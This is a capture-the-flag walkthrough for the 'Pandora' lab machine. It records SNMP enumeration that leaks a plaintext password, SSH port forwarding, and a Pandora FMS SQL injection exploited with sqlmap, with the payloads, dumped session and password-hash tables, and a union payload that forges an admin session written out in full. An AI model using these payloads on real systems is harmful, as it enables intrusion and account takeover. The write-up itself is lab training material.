# Pandora

1. Nmap TCP and UDP port with script
````
# nmap -sS -p- pandora.htb -oG 10.10.11.136-sS
# nmap -sU -p- pandora.htb -oG 10.10.11.136-sU
````

````
# snmpwalk -v2c -c public 10.10.11.136:161 1.3.6.1.2.1.25.4.2.1 > 10.10.11.136-snmpwalk
````

~iso.3.6.1.2.1.25.4.2.1.5.864 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"~

~iso.3.6.1.2.1.25.4.2.1.5.1107 = STRING: "-u daniel -p HotelBabylon23"~

2. Login into remote server
````
# ssh daniel@10.10.11.136
````

3. Enumerates
````
daniel@pandora:~$ ss -nlpt
State          Recv-Q          Send-Q                   Local Address:Port                   Peer Address:Port         Process         
LISTEN         0               80                           127.0.0.1:3306                        0.0.0.0:*                            
LISTEN         0               4096                     127.0.0.53%lo:53                          0.0.0.0:*                            
LISTEN         0               128                            0.0.0.0:22                          0.0.0.0:*                            
LISTEN         0               511                                  *:80                                *:*                            
LISTEN         0               128                               [::]:22                             [::]:*                            
daniel@pandora:~$ curl http://127.0.0.1:80
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
````

4. Login redirecting the remote port
````
# ssh -L80:127.0.0.1:80 daniel@10.10.11.136
````

5. Enumarates
````
v7.0NG.742_FIX_PERL2020
````
- [CVE-2021-32099](https://nvd.nist.gov/vuln/detail/CVE-2021-32099)
- [CVE-2020-5844](https://nvd.nist.gov/vuln/detail/CVE-2020-5844)

6. Test the target system with malformed input values'    "   `   %    %%   --   /*   //    )    ;
http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27%20%20%20%20%22%20%20%20`%20%20%20%%20%20%20%20%%%20%20%20--%20%20%20/*%20%20%20//%20%20%20%20)%20%20%20%20;

````sql
SQL error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use 
near '" ` % %% -- /* // ) ;' LIMIT 1' at line 1 ('SELECT * FROM tsessions_php WHERE `id_session` = '' " ` % %% -- /* // ) ;' LIMIT 1') in
/var/www/pandora/pandora_console/include/db/mysql.php on line 114
````

````
# sqlmap -u '127.0.0.1/pandora_console/include/chart_generator.php?session_id=*' --dbms=MySQL -T tsessions_php --dump
+----------------------------+------------------------------------------------------+-------------+
| id_session                 | data                                                 | last_active |
+----------------------------+------------------------------------------------------+-------------+
| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                             | 1638783555  |
| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                 | 1638789018  |
| 182jpd11radt31ka6nc2j537pl | id_usuario|s:5:"admin";                              | 1642639937  |
| 1um23if7s531kqf5da14kf5lvm | NULL                                                 | 1638792211  |
| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                 | 1638786129  |
| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                             | 1638540332  |
| 37aau5jdov7s5ohpnbs5glo624 | NULL                                                 | 1642643882  |
| 3ma1s0a8vidin664e241ufeak5 | NULL                                                 | 1642639853  |
| 3me2jjab4atfa5f8106iklh4fc | NULL                                                 | 1638795380  |
| 4f51mju7kcuonuqor3876n8o02 | NULL                                                 | 1638786842  |
| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                             | 1638535373  |
| 4pseb28a28ohmk3g4vrbnccfei | NULL                                                 | 1642642764  |
| 4raq16vovvmkmf6vgv6he7a8an | NULL                                                 | 1642639765  |
| 59qae699l0971h13qmbpqahlls | NULL                                                 | 1638787305  |
| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                 | 1638792685  |
| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                             | 1638281946  |
| 5likuau7p4172dfq1vun4mrr49 | NULL                                                 | 1642643827  |
| 5t181k2qdbctt4lbrhfkkoolen | NULL                                                 | 1642643816  |
| 60dnm4v1jqs6t3d857nbc4pmeb | NULL                                                 | 1642643205  |
| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                             | 1641195617  |
| 6dogms24r0u3iflvsq7jp1g1mt | NULL                                                 | 1642639957  |
| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                 | 1623957150  |
| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                             | 1638446321  |
| 8upeameujo9nhki3ps0fu32cgd | NULL                                                 | 1638787267  |
| 9gqb2gquvv66l1aiv3l47ggv02 | NULL                                                 | 1642643230  |
| 9vb1panfn3godbr1qdje903tsa | NULL                                                 | 1642639704  |
| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                             | 1638881787  |
| a3a49kc938u7od6e6mlip1ej80 | NULL                                                 | 1638795315  |
| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                             | 1638881664  |
| ck48te5idg5p7lgfn62tf6sfdg | NULL                                                 | 1642644001  |
| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                 | 1638787213  |
| crm8ilbb533uqb93uavkrtkn59 | id_usuario|s:5:"admin";                              | 1642639934  |
| d0carbrks2lvmb90ergj7jv6po | NULL                                                 | 1638786277  |
| e3uqh6rp0t0arsagedbm92nlj6 | NULL                                                 | 1642642138  |
| etid5n3tvsmabureukthrusb5d | id_usuario|s:5:"admin";                              | 1642639241  |
| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                             | 1641200284  |
| fikt9p6i78no7aofn74rr71m85 | NULL                                                 | 1638786504  |
| fmmteqhtr67642ed24531h120f | id_usuario|s:5:"admin";                              | 1642639845  |
| fqd96rcv4ecuqs409n5qsleufi | NULL                                                 | 1638786762  |
| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                             | 1638783230  |
| g2t34va44qfbt8pqgd3jjdajj5 | NULL                                                 | 1642643272  |
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0;  | 1638796349  |
| gf40pukfdinc63nm5lkroidde6 | NULL                                                 | 1638786349  |
| gldblek3ocihhofkvkieuljq89 | NULL                                                 | 1642642005  |
| heasjj8c48ikjlvsf1uhonfesv | NULL                                                 | 1638540345  |
| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";                             | 1638168492  |
| i3dpmsolfgtip7f01amhfvn751 | id_usuario|s:5:"admin";                              | 1642639258  |
| ipas91isotgius4t3i178j4bhp | NULL                                                 | 1642643384  |
| iv5beqcs988ssf9dopdjmhiu5p | NULL                                                 | 1642643453  |
| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";                             | 1638456173  |
| ked9f8efh2h8i57j83unmjc0m6 | NULL                                                 | 1642642868  |
| kp90bu1mlclbaenaljem590ik3 | NULL                                                 | 1638787808  |
| mfvs0m67oj6adduip9op6udi14 | NULL                                                 | 1642638972  |
| mgjf352nbfso02g0p2sc54bbkv | NULL                                                 | 1642639821  |
| mjauu7824jnn3j7nvl3cv6f3fl | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0; | 1642633294  |
| mmucpc6tk7q4trobtn698rg4t5 | NULL                                                 | 1642643980  |
| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                 | 1638796348  |
| nq03bal0ffl8pnmi3tpd1c5d77 | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0; | 1642629981  |
| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";                             | 1638540482  |
| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";                             | 1637667827  |
| p7g53422ke5ejd2aldnhbii29j | NULL                                                 | 1642644072  |
| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";                             | 1638168416  |
| pvhu2ljvkg528se62mopevduut | id_usuario|s:5:"admin";                              | 1642639056  |
| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                 | 1638787723  |
| qs1uu323m6nrapotv3apem4s7r | NULL                                                 | 1642642035  |
| r097jr6k9s7k166vkvaj17na1u | NULL                                                 | 1638787677  |
| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";                             | 1638889082  |
| rh756ch2ohs50f3sp50slp3kud | NULL                                                 | 1642642675  |
| t03d4h0jn91r5c78s5cg6h0u65 | id_usuario|s:6:"daniel";                             | 1642629237  |
| t97mi5icut7la4cg8ftf15pd9r | NULL                                                 | 1642639295  |
| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";                             | 1638547193  |
| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";                             | 1638793297  |
| ul60hpp96eta3qkt2bscc8r80l | NULL                                                 | 1642642735  |
+----------------------------+------------------------------------------------------+-------------+
````

````sql
'SELECT * FROM tsessions_php WHERE `id_session` = '

' union SELECT 1,2,'id_usuario|s:5:"admin";' as data -- SgGO
````













6. Scan
````
# sqlmap -u '127.0.0.1/pandora_console/include/chart_generator.php?session_id=*'
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
sqlmap identified the following injection point(s) with a total of 241 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: http://127.0.0.1:80/pandora_console/include/chart_generator.php?session_id=-3520' OR 1191=1191#

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://127.0.0.1:80/pandora_console/include/chart_generator.php?session_id=' OR (SELECT 5536 FROM(SELECT COUNT(*),CONCAT(0x7162767671,(SELECT (ELT(5536=5536,1))),0x71707a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VqwU

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://127.0.0.1:80/pandora_console/include/chart_generator.php?session_id=' AND (SELECT 8615 FROM (SELECT(SLEEP(5)))jdWS)-- MiTJ
---
[22:44:07] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41, PHP
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[22:44:07] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.0.0.1'
````

````
# sqlmap -u '127.0.0.1/pandora_console/include/chart_generator.php?session_id=*' --dbms=MySQL -T tusuario -C id_user,is_admin,password --dump
+---------+----------+----------------------------------+
| id_user | is_admin | password                         |
+---------+----------+----------------------------------+
| admin   | 1        | ad3f741b04bd5880fb32b54bc4f43d6a |
| daniel  | 0        | 76323c174bd49ffbbdedf678f6cc89a6 |
| matt    | 0        | f655f807365b6dc602b31ab3d6d43acc |
+---------+----------+----------------------------------+

````sql
' union SELECT 1,2,'id_usuario|s:5:"admin";' as data -- SgGO
````


[OID repository](http://www.oid-info.com/get/1.3.6.1.2.1.25.4.2.1.5)
